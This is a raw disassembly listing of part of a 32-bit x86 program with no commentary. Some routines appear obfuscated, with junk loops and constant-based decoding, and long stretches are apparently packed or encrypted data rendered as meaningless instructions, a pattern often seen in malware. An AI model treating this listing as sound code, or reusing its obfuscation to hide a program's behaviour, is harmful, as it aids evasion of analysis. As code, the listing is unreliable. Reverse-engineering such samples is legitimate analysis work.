  41090b:	je     0x410962
  41090d:	xchg   edi,eax
  41090e:	sub    ebp,DWORD PTR [ecx+0x51d0454]
  410914:	cmp    eax,0x4b125720
  410919:	pop    ss
  41091a:	int    0xbd
  41091c:	shr    eax,1
  41091e:	fcmovu st,st(0)
  410920:	ss jge 0x4108d6
  410923:	dec    ebp
  410924:	cmp    eax,0x4484a83a
  410929:	and    ah,BYTE PTR [edx-0x303d9447]
  41092f:	mov    DWORD PTR [esi-0x12],ebx
  410932:	rol    DWORD PTR [edi],1
  410934:	cdq    
  410935:	rcr    DWORD PTR [ecx+0x5835fde2],0xa9
  41093c:	mov    eax,0xac3ace33
  410941:	repz or BYTE PTR [ebp+0x53],ah
  410945:	jmp    0x64eca959
  41094a:	sti    
  41094b:	pop    es
  41094c:	pop    edi
  41094d:	stos   DWORD PTR es:[edi],eax
  41094e:	mov    BYTE PTR [edi+0xcee6eca],ch
  410954:	mov    bl,0xa3
  410956:	mov    ds:0x182b69f1,eax
  41095b:	cmp    DWORD PTR [esi-0x8],esp
  41095e:	adc    edx,DWORD PTR [edx+0x41]
  410961:	in     al,dx
  410962:	(bad)  
  410963:	jo     0x4109ba
  410965:	dec    esi
  410966:	mov    dh,0x90
  410968:	ins    DWORD PTR es:[edi],dx
  410969:	pop    esp
  41096a:	mov    esp,0x75ead2f5
  41096f:	or     eax,0xe0c43270
  410974:	sahf   
  410975:	mov    ecx,0x16623490
  41097a:	ds dec ecx
  41097c:	sbb    ah,bl
  41097e:	mov    ebx,0x49ce3fa7
  410983:	cmc    
  410984:	sbb    DWORD PTR [esi+ecx*8],0x68
  410988:	xlat   BYTE PTR ds:[ebx]
  410989:	push   ebx
  41098a:	into   
  41098b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41098c:	or     DWORD PTR [ebx-0x4af79534],edi
  410992:	dec    eax
  410993:	inc    edx
  410994:	push   ebp
  410995:	xlat   BYTE PTR ds:[ebx]
  410996:	xor    BYTE PTR [esi],0x2
  410999:	stc    
  41099a:	mov    ds:0xa6dd4258,eax
  41099f:	fstp   QWORD PTR [esi]
  4109a1:	fld    QWORD PTR [ecx]
  4109a3:	adc    dh,BYTE PTR [ecx+0x3e]
  4109a6:	cmp    al,0xa5
  4109a8:	mov    al,BYTE PTR [eax-0x48]
  4109ab:	sbb    al,BYTE PTR ds:0x3f2e9268
  4109b1:	jl     0x410977
  4109b3:	xor    DWORD PTR [eax],esi
  4109b5:	ret    
  4109b6:	jecxz  0x4109c6
  4109b8:	jmp    0xbd2dc6c9
  4109bd:	(bad)  
  4109be:	outs   dx,BYTE PTR ds:[esi]
  4109bf:	icebp  
  4109c0:	cmp    al,0x2f
  4109c2:	mov    ebx,0x3706d227
  4109c7:	push   ebx
  4109c8:	mov    WORD PTR [ebx-0x60663ff0],ds
  4109ce:	rcl    BYTE PTR es:[esi-0x73a021b3],1
  4109d5:	xchg   ecx,eax
  4109d6:	inc    edx
  4109d7:	jo     0x410a3f
  4109d9:	cmp    ecx,edx
  4109db:	jne    0x40e62e
  4109e1:	mov    ecx,DWORD PTR ds:0x424435
  4109e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4109ed:	mov    DWORD PTR [ecx],eax
  4109ef:	jmp    0x410a15
  4109f4:	mov    ecx,DWORD PTR [ebp+0x18]
  4109f7:	cmp    ecx,0xf89c85b2
  4109fd:	jne    0x410a15
  410a03:	push   eax
  410a04:	push   DWORD PTR [ebp+0x14]
  410a07:	push   DWORD PTR [ebp+0x10]
  410a0a:	push   DWORD PTR [ebp+0xc]
  410a0d:	push   DWORD PTR [ebp+0x8]
  410a10:	call   0x40772b
  410a15:	pop    edi
  410a16:	pop    esi
  410a17:	leave  
  410a18:	ret    0x14
  410a1b:	push   ebp
  410a1c:	mov    ebp,esp
  410a1e:	push   ecx
  410a1f:	and    DWORD PTR ds:0x422004,0x0
  410a29:	jmp    0x410a3b
  410a2e:	mov    edx,DWORD PTR ds:0x422004
  410a34:	inc    edx
  410a35:	mov    DWORD PTR ds:0x422004,edx
  410a3b:	cmp    DWORD PTR ds:0x422004,0x13
  410a42:	jae    0x410a8f
  410a48:	cmp    DWORD PTR ds:0x422004,0xb
  410a4f:	jne    0x410a68
  410a55:	push   DWORD PTR [ebp-0xc]
  410a58:	push   0x42201c
  410a5d:	push   0x5e67
  410a62:	call   DWORD PTR ds:0x4247d9
  410a68:	cmp    DWORD PTR ds:0x422004,0xa
  410a6f:	jne    0x410a84
  410a75:	xor    edx,edx
  410a77:	add    edx,DWORD PTR ds:0x422004
  410a7d:	inc    edx
  410a7e:	mov    DWORD PTR ds:0x422004,edx
  410a84:	jmp    0x410a2e
  410a89:	xor    edx,DWORD PTR ds:0x420ef4
  410a8f:	push   ecx
  410a90:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  410a97:	xor    eax,eax
  410a99:	xor    eax,DWORD PTR ds:0x420f9c
  410a9f:	adc    DWORD PTR ds:0x420fb4,eax
  410aa5:	mov    DWORD PTR [ebp-0x4],0xf89c85b2
  410aac:	neg    eax
  410aae:	mov    eax,DWORD PTR [ebp-0x4]
  410ab1:	mov    ecx,DWORD PTR ds:0x420fa0
  410ab7:	adc    DWORD PTR ds:0x420e7e,ecx
  410abd:	push   esi
  410abe:	mov    esi,DWORD PTR [ebp-0x8]
  410ac1:	mov    edx,DWORD PTR ds:0x420f44
  410ac7:	mov    ecx,DWORD PTR ds:0x423010
  410acd:	sub    ecx,edx
  410acf:	xor    edx,DWORD PTR [edx+ecx*1]
  410ad2:	mov    edx,0x7510896
  410ad7:	mov    DWORD PTR ds:0x420fa4,0x1c
  410ae1:	cmp    DWORD PTR ds:0x420fa4,0x0
  410ae8:	je     0x410b1f
  410aee:	cmp    DWORD PTR ds:0x420fa4,0x1e
  410af5:	jne    0x410b0b
  410afb:	push   0x424143
  410b00:	push   0x4240f3
  410b05:	call   DWORD PTR ds:0x4247dd
  410b0b:	xor    ecx,ecx
  410b0d:	or     ecx,DWORD PTR ds:0x420fa4
  410b13:	dec    ecx
  410b14:	mov    DWORD PTR ds:0x420fa4,ecx
  410b1a:	jmp    0x410ae1
  410b1f:	xor    eax,edx
  410b21:	xor    esi,edx
  410b23:	mov    ecx,0x3272dd
  410b28:	add    esi,ecx
  410b2a:	add    eax,ecx
  410b2c:	imul   eax,esi
  410b2f:	mov    esi,DWORD PTR [ebp+0xc]
  410b32:	cmp    esi,eax
  410b34:	jne    0x410b50
  410b3a:	mov    eax,DWORD PTR [ebp-0x4]
  410b3d:	mov    esi,DWORD PTR [ebp-0x8]
  410b40:	xor    eax,edx
  410b42:	xor    esi,edx
  410b44:	add    eax,ecx
  410b46:	add    esi,ecx
  410b48:	imul   eax,esi
  410b4b:	jmp    0x410b8b
  410b50:	mov    eax,DWORD PTR [ebp+0xc]
  410b53:	mov    eax,DWORD PTR [eax+0x78]
  410b56:	mov    DWORD PTR [ebp+0xc],eax
  410b59:	mov    eax,DWORD PTR [ebp-0x4]
  410b5c:	mov    esi,DWORD PTR [ebp-0x8]
  410b5f:	xor    eax,edx
  410b61:	xor    esi,edx
  410b63:	add    eax,ecx
  410b65:	add    esi,ecx
  410b67:	imul   eax,esi
  410b6a:	mov    esi,DWORD PTR [ebp+0xc]
  410b6d:	cmp    esi,eax
  410b6f:	mov    eax,DWORD PTR [ebp-0x4]
  410b72:	je     0x410b3d
  410b78:	xor    eax,edx
  410b7a:	add    eax,ecx
  410b7c:	mov    ecx,DWORD PTR [ebp+0xc]
  410b7f:	imul   eax,ecx
  410b82:	add    eax,DWORD PTR [ebp+0x8]
  410b85:	mov    DWORD PTR [ebp+0xc],eax
  410b88:	mov    eax,DWORD PTR [ebp+0xc]
  410b8b:	pop    esi
  410b8c:	leave  
  410b8d:	ret    0x8
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	push   ecx
  410b94:	and    DWORD PTR ds:0x420ef0,0x0
  410b9e:	mov    eax,ds:0x420ef0
  410ba3:	inc    eax
  410ba4:	mov    ds:0x420ef0,eax
  410ba9:	cmp    DWORD PTR ds:0x420ef0,0x6
  410bb0:	jne    0x410bc7
  410bb6:	push   0x613e
  410bbb:	push   DWORD PTR [ebp-0xc]
  410bbe:	push   DWORD PTR [ebp-0x10]
  410bc1:	call   DWORD PTR ds:0x4247e1
  410bc7:	cmp    DWORD PTR ds:0x420ef0,0x5
  410bce:	jne    0x410be2
  410bd4:	xor    eax,eax
  410bd6:	or     eax,DWORD PTR ds:0x420ef0
  410bdc:	inc    eax
  410bdd:	mov    ds:0x420ef0,eax
  410be2:	cmp    DWORD PTR ds:0x420ef0,0x1b
  410be9:	jb     0x410b9e
  410bef:	or     DWORD PTR ds:0x420e8e,0x6d67
  410bf9:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  410c00:	mov    eax,DWORD PTR [ebp-0x4]
  410c03:	mov    ecx,DWORD PTR ds:0x420f08
  410c09:	sbb    ecx,DWORD PTR ds:0x420ef4
  410c0f:	mov    DWORD PTR ds:0x420f08,ecx
  410c15:	mov    edx,DWORD PTR [ebp+0x10]
  410c18:	mov    ecx,DWORD PTR ds:0x42201c
  410c1e:	sub    DWORD PTR ds:0x42200c,ecx
  410c24:	mov    ecx,0x7510896
  410c29:	xor    eax,ecx
  410c2b:	add    eax,0x3272dd
  410c30:	mov    DWORD PTR [edx],eax
  410c32:	mov    eax,DWORD PTR [ebp+0xc]
  410c35:	xor    eax,ecx
  410c37:	push   esi
  410c38:	mov    esi,DWORD PTR [ebp+0x10]
  410c3b:	mov    edx,0x3272dd
  410c40:	add    eax,edx
  410c42:	mov    DWORD PTR [esi+0x4],eax
  410c45:	mov    eax,DWORD PTR [ebp+0x14]
  410c48:	mov    esi,DWORD PTR [ebp+0x10]
  410c4b:	mov    DWORD PTR [esi+0x8],eax
  410c4e:	mov    eax,DWORD PTR [ebp+0x18]
  410c51:	mov    esi,DWORD PTR [ebp+0x10]
  410c54:	mov    DWORD PTR [esi+0xc],eax
  410c57:	mov    eax,DWORD PTR [ebp+0x1c]
  410c5a:	mov    esi,DWORD PTR [ebp+0x10]
  410c5d:	mov    DWORD PTR [esi+0x10],eax
  410c60:	mov    eax,DWORD PTR [ebp+0x8]
  410c63:	xor    eax,ecx
  410c65:	add    eax,edx
  410c67:	pop    esi
  410c68:	leave  
  410c69:	ret    0x18
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	sub    esp,0xa4
  410c75:	or     eax,eax
  410c77:	mov    ecx,DWORD PTR [ebp+0x8]
  410c7a:	mov    eax,0x8a89
  410c7f:	xor    ax,WORD PTR [ecx+0x20]
  410c83:	mov    ecx,0x3b4c
  410c88:	and    DWORD PTR ds:0x420fac,0x1c5
  410c92:	add    ax,cx
  410c95:	movzx  eax,ax
  410c98:	and    DWORD PTR ds:0x420e8a,0x0
  410ca2:	mov    ecx,DWORD PTR ds:0x420e8a
  410ca8:	inc    ecx
  410ca9:	mov    DWORD PTR ds:0x420e8a,ecx
  410caf:	cmp    DWORD PTR ds:0x420e8a,0x9
  410cb6:	jne    0x410ccd
  410cbc:	push   DWORD PTR [ebp-0x20]
  410cbf:	push   0x420f08
  410cc4:	push   DWORD PTR [ebp-0x10]
  410cc7:	call   DWORD PTR ds:0x4247e5
  410ccd:	cmp    DWORD PTR ds:0x420e8a,0x8
  410cd4:	jne    0x410ce9
  410cda:	xor    ecx,ecx
  410cdc:	add    ecx,DWORD PTR ds:0x420e8a
  410ce2:	inc    ecx
  410ce3:	mov    DWORD PTR ds:0x420e8a,ecx
  410ce9:	cmp    DWORD PTR ds:0x420e8a,0x16
  410cf0:	jb     0x410ca2
  410cf6:	mov    DWORD PTR [ebp-0x18],eax
  410cf9:	mov    BYTE PTR [ebp-0x1],0x7d
  410cfd:	sub    ecx,DWORD PTR ds:0x420e9a
  410d03:	lea    eax,[ebp-0x1]
  410d06:	and    DWORD PTR ds:0x420e82,0x0
  410d10:	xor    ecx,ecx
  410d12:	or     ecx,DWORD PTR ds:0x420e82
  410d18:	inc    ecx
  410d19:	mov    DWORD PTR ds:0x420e82,ecx
  410d1f:	cmp    DWORD PTR ds:0x420e82,0x14
  410d26:	jne    0x410d32
  410d2c:	call   DWORD PTR ds:0x4247f1
  410d32:	cmp    DWORD PTR ds:0x420e82,0x11
  410d39:	jb     0x410d10
  410d3f:	mov    DWORD PTR [ebp-0x10],eax
  410d42:	or     DWORD PTR ds:0x420fa8,edx
  410d48:	mov    al,BYTE PTR [ebp-0x1]
  410d4b:	sub    DWORD PTR ds:0x422008,ebx
  410d51:	mov    ecx,DWORD PTR [ebp-0x10]
  410d54:	xor    al,0x71
  410d56:	sbb    DWORD PTR ds:0x420fb0,0x420f04
  410d60:	sub    al,0xb
  410d62:	add    DWORD PTR ds:0x420f00,0x7fa5
  410d6c:	mov    BYTE PTR [ecx],al
  410d6e:	sbb    ecx,0xfb
  410d74:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  410d7b:	neg    eax
  410d7d:	push   ebx
  410d7e:	and    DWORD PTR ds:0x420f68,ebx
  410d84:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  410d8b:	not    ecx
  410d8d:	mov    ecx,DWORD PTR [ebp-0x14]
  410d90:	and    DWORD PTR ds:0x420ef8,0x0
  410d9a:	mov    eax,ds:0x420ef8
  410d9f:	inc    eax
  410da0:	mov    ds:0x420ef8,eax
  410da5:	cmp    DWORD PTR ds:0x420ef8,0xd
  410dac:	jne    0x410db8
  410db2:	call   DWORD PTR ds:0x4247f5
  410db8:	cmp    DWORD PTR ds:0x420ef8,0xc
  410dbf:	jne    0x410dd0
  410dc5:	mov    eax,ds:0x420ef8
  410dca:	inc    eax
  410dcb:	mov    ds:0x420ef8,eax
  410dd0:	cmp    DWORD PTR ds:0x420ef8,0x1f
  410dd7:	jb     0x410d9a
  410ddd:	or     DWORD PTR ds:0x420fa4,edx
  410de3:	push   esi
  410de4:	mov    eax,0x7510896
  410de9:	xor    ecx,eax
  410deb:	and    DWORD PTR ds:0x420fb0,0x0
  410df5:	jmp    0x410e07
  410dfa:	mov    esi,DWORD PTR ds:0x420fb0
  410e00:	inc    esi
  410e01:	mov    DWORD PTR ds:0x420fb0,esi
  410e07:	cmp    DWORD PTR ds:0x420fb0,0x16
  410e0e:	jae    0x410e4f
  410e14:	cmp    DWORD PTR ds:0x420fb0,0x26
  410e1b:	jne    0x410e44
  410e21:	push   0x2107
  410e26:	push   DWORD PTR [ebp-0xc]
  410e29:	push   0x420ea2
  410e2e:	push   DWORD PTR [ebp-0xc]
  410e31:	push   0x1296
  410e36:	push   0x8533
  410e3b:	push   DWORD PTR [ebp-0x24]
  410e3e:	call   DWORD PTR ds:0x4247f9
  410e44:	jmp    0x410dfa
  410e49:	xor    esi,0x6f84
  410e4f:	mov    esi,0x3272dd
  410e54:	push   edi
  410e55:	adc    DWORD PTR ds:0x422000,0x420fb0
  410e5f:	add    ecx,esi
  410e61:	jmp    0x410e7b
  410e66:	mov    DWORD PTR ds:0x422018,0x61e6
  410e70:	mov    dl,BYTE PTR [ebp-0x1]
  410e73:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  410e7a:	inc    ecx
  410e7b:	mov    DWORD PTR ds:0x420fa8,0x4793
  410e85:	cmp    ecx,0x40
  410e88:	mov    DWORD PTR ds:0x420f98,0x2ddc
  410e92:	jb     0x410e66
  410e98:	mov    edx,DWORD PTR ds:0x420e7a
  410e9e:	adc    DWORD PTR ds:0x420f58,edx
  410ea4:	mov    edx,DWORD PTR [ebp-0x14]
  410ea7:	add    DWORD PTR ds:0x420f9c,0x420e8e
  410eb1:	xor    edx,eax
  410eb3:	or     DWORD PTR ds:0x420e9e,0x6c51
  410ebd:	add    edx,esi
  410ebf:	mov    DWORD PTR ds:0x420f98,0x212f
  410ec9:	jmp    0x410f67
  410ece:	mov    ecx,DWORD PTR ds:0x420f58
  410ed4:	adc    ecx,DWORD PTR ds:0x420ef8
  410eda:	mov    DWORD PTR ds:0x420f58,ecx
  410ee0:	mov    edi,DWORD PTR [ebp+0x8]
  410ee3:	neg    ecx
  410ee5:	mov    ecx,0x8a89
  410eea:	mov    DWORD PTR ds:0x422010,0x1e03
  410ef4:	xor    cx,WORD PTR [edi+edx*4+0x2]
  410ef9:	xor    DWORD PTR ds:0x420efc,0x6f5f
  410f03:	mov    edi,0x3b4c
  410f08:	sbb    DWORD PTR ds:0x420f9c,0x63db
  410f12:	add    cx,di
  410f15:	add    DWORD PTR ds:0x42201c,0x420fa0
  410f1f:	movzx  ecx,cx
  410f22:	sub    DWORD PTR ds:0x420f08,0x420f5c
  410f2c:	mov    DWORD PTR [ebp-0x10],ecx
  410f2f:	mov    ecx,DWORD PTR [ebp+0x8]
  410f32:	add    DWORD PTR ds:0x422004,0x422010
  410f3c:	movzx  ecx,WORD PTR [ecx+edx*4]
  410f40:	xor    ecx,0x8a89
  410f46:	and    DWORD PTR ds:0x420ef8,0x48dd
  410f50:	add    ecx,edi
  410f52:	mov    edi,DWORD PTR [ebp-0x10]
  410f55:	mov    DWORD PTR ds:0x420fb4,0x2f78
  410f5f:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  410f66:	inc    edx
  410f67:	mov    DWORD PTR ds:0x420e7a,edx
  410f6d:	mov    ecx,DWORD PTR [ebp-0x18]
  410f70:	mov    DWORD PTR ds:0x420f08,0x1ffa
  410f7a:	cmp    edx,ecx
  410f7c:	mov    DWORD PTR ds:0x420efc,0x1e95
  410f86:	jne    0x410ece
  410f8c:	mov    ecx,DWORD PTR [ebp-0x14]
  410f8f:	add    edx,0x1ead
  410f95:	mov    edx,DWORD PTR [ebp+0x10]
  410f98:	sbb    DWORD PTR ds:0x422008,0x2f5c
  410fa2:	xor    ecx,eax
  410fa4:	and    DWORD PTR ds:0x422018,0x2dc0
  410fae:	add    ecx,esi
  410fb0:	jmp    0x41333d
  410fb5:	lods   eax,DWORD PTR ds:[esi]
  410fb6:	mov    ecx,0xd4095449
  410fbb:	jae    0x411038
  410fbd:	sbb    BYTE PTR [ebx-0x77b39d61],0xc2
  410fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fc5:	cs scas al,BYTE PTR es:[edi]
  410fc7:	jp     0x411043
  410fc9:	or     bl,BYTE PTR [edi+0x7a]
  410fcc:	jp     0x410fd3
  410fce:	fisubr WORD PTR ds:0x1c4948e0
  410fd4:	jbe    0x410f6b
  410fd6:	or     ch,BYTE PTR [edx*2-0xc2583e2]
  410fdd:	dec    ebx
  410fde:	or     esp,0xffffffb2
  410fe1:	test   eax,0xc08306be
  410fe6:	addr16 pop ebx
  410fe8:	stos   DWORD PTR es:[edi],eax
  410fe9:	jle    0x410fd3
  410feb:	adc    eax,0xf2545d66
  410ff0:	call   0x100887
  410ff5:	push   ss
  410ff6:	test   DWORD PTR [esi+0x4819e0ab],ecx
  410ffc:	mov    bl,BYTE PTR [eax+0x55]
  410fff:	sti    
  411000:	xchg   ebx,eax
  411001:	dec    ebx
  411002:	icebp  
  411003:	adc    al,0x86
  411005:	pop    edi
  411006:	fisub  DWORD PTR [edx+0x60]
  411009:	cmp    BYTE PTR [edx*2-0x7b9599e8],dl
  411010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411011:	or     edx,eax
  411013:	mov    edx,0x68104531
  411018:	inc    edx
  411019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41101a:	pop    ebp
  41101b:	jno    0x411078
  41101d:	jnp    0x410fc2
  41101f:	inc    ebp
  411020:	mov    BYTE PTR [ebx*8-0x89ff158],dh
  411027:	mov    dl,ah
  411029:	loopne 0x411063
  41102b:	inc    ecx
  41102c:	adc    BYTE PTR [edi+0x53],bl
  41102f:	sub    al,0x19
  411031:	retf   
  411032:	add    eax,0x46c41645
  411037:	fnstcw WORD PTR [ecx]
  411039:	dec    edx
  41103a:	out    0xec,eax
  41103c:	lods   eax,DWORD PTR ds:[esi]
  41103d:	inc    ecx
  41103e:	mov    dh,0xd1
  411040:	sti    
  411041:	aad    0xb5
  411043:	repnz inc ecx
  411045:	push   es
  411046:	fcomi  st,st(4)
  411048:	jecxz  0x4110be
  41104a:	mov    ?,ebx
  41104c:	ret    
  41104d:	sub    eax,0x2cee43d4
  411052:	pop    esi
  411053:	shl    DWORD PTR [eax],0xba
  411056:	adc    ebp,DWORD PTR [edi-0x80]
  411059:	pushf  
  41105a:	aas    
  41105b:	jnp    0x41103a
  41105d:	nop
  41105e:	mov    ds:0xa1c6534b,eax
  411063:	mov    cl,BYTE PTR [edi]
  411065:	ss add al,0xff
  411068:	loope  0x41106d
  41106a:	inc    edi
  41106b:	lods   eax,DWORD PTR ds:[esi]
  41106c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41106d:	xor    BYTE PTR [eax],al
  41106f:	inc    ebx
  411070:	inc    ebp
  411071:	js     0x411072
  411073:	push   cs
  411074:	dec    ebp
  411075:	xor    BYTE PTR [ecx+0x2263e29],al
  41107b:	mov    cl,0xd0
  41107d:	jo     0x41103e
  41107f:	mov    DWORD PTR [di],esp
  411082:	inc    edx
  411083:	jae    0x4110d8
  411085:	popa   
  411086:	cmp    al,0x21
  411088:	jge    0x41108a
  41108a:	adc    al,0xd2
  41108c:	push   ss
  41108d:	dec    ebp
  41108e:	jne    0x41106c
  411090:	or     BYTE PTR [edx+0x6c54bcb9],dh
  411096:	cwde   
  411097:	fdivr  DWORD PTR [edi]
  411099:	test   al,0xd8
  41109b:	mov    al,0x6b
  41109d:	inc    edx
  41109e:	xor    eax,0xbf1aaf06
  4110a3:	lea    esp,[eax]
  4110a5:	stos   BYTE PTR es:[edi],al
  4110a6:	mov    ?,WORD PTR [esi+0x4a]
  4110a9:	mov    edi,0xfca78859
  4110ae:	xchg   edx,eax
  4110af:	cmp    eax,0x7f271a84
  4110b4:	sahf   
  4110b5:	or     al,bl
  4110b7:	out    dx,eax
  4110b8:	push   ss
  4110b9:	std    
  4110ba:	pop    ecx
  4110bb:	mov    ecx,0xc4ad6994
  4110c0:	daa    
  4110c1:	dec    ecx
  4110c2:	je     0x411123
  4110c4:	pop    edi
  4110c5:	cmp    DWORD PTR [ebx+0x38],eax
  4110c8:	sub    dl,dh
  4110ca:	test   eax,0x42ce1923
  4110cf:	sbb    ah,BYTE PTR [ebp-0x55]
  4110d2:	xchg   ecx,eax
  4110d3:	adc    al,0x6f
  4110d5:	cmp    DWORD PTR [ebp+ebx*1+0x63cc342e],0xffffffed
  4110dd:	call   DWORD PTR ds:0x430982b
  4110e3:	addr16 mov ah,0xc
  4110e6:	inc    edi
  4110e7:	call   0x977d:0x5f4c40ce
  4110ee:	pushf  
  4110ef:	sub    ebx,0x7c1f42d6
  4110f5:	in     al,0xf9
  4110f7:	lahf   
  4110f8:	add    cl,BYTE PTR [ebp-0xd]
  4110fb:	loope  0x411174
  4110fd:	in     eax,0x86
  4110ff:	push   ebp
  411100:	dec    esi
  411101:	dec    esp
  411102:	xor    eax,0x37cc6122
  411107:	(bad)  
  41110a:	push   ds
  41110b:	lock not DWORD PTR [esi+edx*8+0x2920ff14]
  411113:	mov    ebx,0x9ec1452e
  411118:	xor    ebp,DWORD PTR [edx-0x2d]
  41111b:	dec    edi
  41111c:	scas   al,BYTE PTR es:[edi]
  41111d:	or     edx,DWORD PTR [edx]
  41111f:	lahf   
  411120:	dec    ebx
  411121:	push   ds
  411122:	inc    edi
  411123:	jno    0x411176
  411125:	sub    al,0x0
  411127:	adc    ch,BYTE PTR [eax+0x59]
  41112a:	dec    ebx
  41112b:	add    ebp,DWORD PTR [edx]
  41112d:	ret    0x3432
  411130:	or     ecx,DWORD PTR [ecx+0x5a8500db]
  411136:	jmp    0x5b8996bf
  41113b:	cmp    al,0xef
  41113d:	add    ecx,ebx
  41113f:	xchg   edx,eax
  411140:	cli    
  411141:	sbb    esp,esi
  411143:	stc    
  411144:	xor    cl,BYTE PTR [eax+esi*2-0x75]
  411148:	pop    ebp
  411149:	xchg   esi,eax
  41114a:	or     BYTE PTR [ecx-0x583ed8c8],bh
  411150:	pop    ss
  411151:	lock ds adc dh,bh
  411155:	sub    al,0x1c
  411157:	cmc    
  411158:	dec    eax
  411159:	jb     0x41111e
  41115b:	ins    BYTE PTR es:[edi],dx
  41115c:	(bad)  
  41115d:	push   ecx
  41115e:	inc    edi
  41115f:	pop    ebp
  411160:	add    DWORD PTR ds:0x36a3572c,ecx
  411166:	mov    bh,BYTE PTR [ebp+0x773e6641]
  41116c:	pop    edi
  41116d:	leave  
  41116e:	push   ss
  41116f:	clc    
  411170:	sbb    DWORD PTR [ebx-0x4059521b],ecx
  411176:	pop    esp
  411177:	int3   
  411178:	das    
  411179:	les    edi,FWORD PTR [ecx-0x4]
  41117c:	ins    DWORD PTR es:[edi],dx
  41117d:	aaa    
  41117e:	ret    0xbb0d
  411181:	xchg   ebx,eax
  411182:	(bad)  
  411183:	stos   BYTE PTR es:[edi],al
  411184:	in     eax,0xc7
  411186:	clc    
  411187:	je     0x41112e
  411189:	in     eax,dx
  41118a:	rcl    DWORD PTR [ecx+eax*2],cl
  41118d:	cdq    
  41118e:	rcr    ebp,0x5
  411191:	fst    QWORD PTR [esi]
  411193:	cmp    BYTE PTR [esi+0x3],al
  411196:	fist   DWORD PTR [edx]
  411198:	mov    edi,0x3714492f
  41119d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41119e:	scas   eax,DWORD PTR es:[edi]
  41119f:	repnz mov dl,BYTE PTR [ecx]
  4111a2:	enter  0x3ac5,0x31
  4111a6:	sub    al,0x70
  4111a8:	jl     0x411153
  4111aa:	xor    DWORD PTR [esi+edi*8-0x9],eax
  4111ae:	jne    0x411174
  4111b0:	fst    QWORD PTR [eax-0x32962054]
  4111b6:	cs jae 0x411225
  4111b9:	in     al,0x87
  4111bb:	out    0xd6,eax
  4111bd:	push   ebx
  4111be:	leave  
  4111bf:	lahf   
  4111c0:	xor    al,0x9d
  4111c2:	scas   al,BYTE PTR es:[edi]
  4111c3:	ins    BYTE PTR es:[edi],dx
  4111c4:	cmp    ebx,esp
  4111c6:	ror    BYTE PTR [eax],0x56
  4111c9:	and    al,0xbb
  4111cb:	fs cli 
  4111cd:	pop    esi
  4111ce:	mov    esp,0x5cb6700
  4111d3:	dec    esp
  4111d4:	sub    al,0xae
  4111d6:	out    dx,al
  4111d7:	cld    
  4111d8:	sbb    cl,BYTE PTR [edi-0x5a]
  4111db:	jb     0x411202
  4111dd:	jno    0x4111aa
  4111df:	jge    0x4111e4
  4111e1:	sub    al,0x8b
  4111e3:	(bad)  
  4111e4:	fdivr  QWORD PTR [eax]
  4111e6:	jge    0x41121e
  4111e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111e9:	push   ds
  4111ea:	and    BYTE PTR [ebx],ah
  4111ec:	cs push ebp
  4111ee:	adc    al,0x33
  4111f0:	mov    ah,0xd6
  4111f2:	adc    bh,BYTE PTR [ebp-0x2a]
  4111f5:	mov    edx,0x82799f4e
  4111fa:	not    ebx
  4111fc:	popa   
  4111fd:	adc    eax,0xd47fc0bf
  411202:	mov    ebp,0x6f146395
  411207:	mov    edi,0xc033760c
  41120c:	sub    al,0xff
  41120e:	hlt    
  41120f:	sub    cl,BYTE PTR [ecx]
  411211:	inc    esp
  411212:	loope  0x411288
  411214:	ds jae 0x411280
  411217:	mov    ebx,0xd1921f8a
  41121c:	gs (bad) 
  41121e:	and    cl,BYTE PTR [eax+0x1b]
  411221:	add    al,0x8a
  411223:	inc    edi
  411224:	clc    
  411225:	push   cs
  411226:	cld    
  411227:	addr16 pop eax
  411229:	adc    al,0x52
  41122b:	push   0x8e197e95
  411230:	and    ebx,esp
  411232:	retf   0x198d
  411235:	xor    eax,edi
  411237:	inc    edi
  411238:	add    eax,0x7a680eea
  41123d:	push   ecx
  41123e:	xor    BYTE PTR [edi-0x2d6b2dc8],ch
  411244:	jg     0x4112c2
  411246:	lea    ebp,[ecx]
  411248:	call   0x7bd2b0ae
  41124d:	cmp    DWORD PTR [eax],esi
  41124f:	test   al,0xa9
  411251:	call   0xe62f:0xf8713174
  411258:	cmp    dh,BYTE PTR [esi+eax*4-0x46]
  41125c:	jp     0x41126c
  41125e:	sti    
  41125f:	inc    esp
  411260:	aam    0x9f
  411262:	xor    bl,BYTE PTR [eax+0x38]
  411265:	enter  0xdcd,0xe5
  411269:	jbe    0x411285
  41126b:	cmp    esp,edx
  41126d:	shr    DWORD PTR [ebp+ecx*2-0x315bab29],cl
  411274:	or     ebx,DWORD PTR [esi+0x1c]
  411277:	pusha  
  411278:	mov    cl,0x39
  41127a:	ror    dl,1
  41127c:	int3   
  41127d:	cs into 
  41127f:	leave  
  411280:	in     eax,dx
  411281:	adc    DWORD PTR [edi+eax*4+0x12],ebx
  411285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411286:	fadd   DWORD PTR [edx]
  411288:	xor    eax,DWORD PTR [ebx-0x7b]
  41128b:	sub    BYTE PTR [ebx+0x3e],al
  41128e:	repz add dl,BYTE PTR [ebx]
  411291:	or     eax,0xe1b5eb75
  411296:	mov    ch,BYTE PTR [edx]
  411298:	cmp    eax,DWORD PTR [esi+edi*8-0x18]
  41129c:	inc    esp
  41129d:	push   ds
  41129e:	lods   eax,DWORD PTR ds:[esi]
  41129f:	or     al,0xc1
  4112a1:	and    DWORD PTR [esi-0x1035cb10],ebp
  4112a7:	jecxz  0x411316
  4112a9:	jle    0x411304
  4112ab:	pop    esp
  4112ac:	fidiv  DWORD PTR [edi-0x7101bb2b]
  4112b2:	pop    ebp
  4112b3:	ror    BYTE PTR es:[ebp-0x51cb7acf],1
  4112ba:	push   es
